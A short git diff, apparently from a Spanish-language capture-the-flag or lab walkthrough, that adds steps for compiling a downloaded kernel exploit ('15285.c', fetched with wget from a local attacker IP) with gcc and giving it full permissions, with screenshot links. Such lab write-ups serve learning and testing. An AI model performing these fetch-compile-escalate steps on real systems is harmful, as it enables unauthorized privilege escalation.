@@ -127,3 +127,9 @@ wget http://192.168.1.9/15285.c
 ```
 ![15](https://user-images.githubusercontent.com/75953873/171932443-98620783-0a4f-4007-b69e-fe03b8ce7612.png)
 
+Seguidamente compilamos el código y le damos permisos de lectura, escritura y ejecución:
+```
+gcc 15285.c -o kernel
+chmod 777 kernel
+```
+![17](https://user-images.githubusercontent.com/75953873/171933850-a08f1cb8-f9fa-4762-96f9-cc2af26619a2.png)
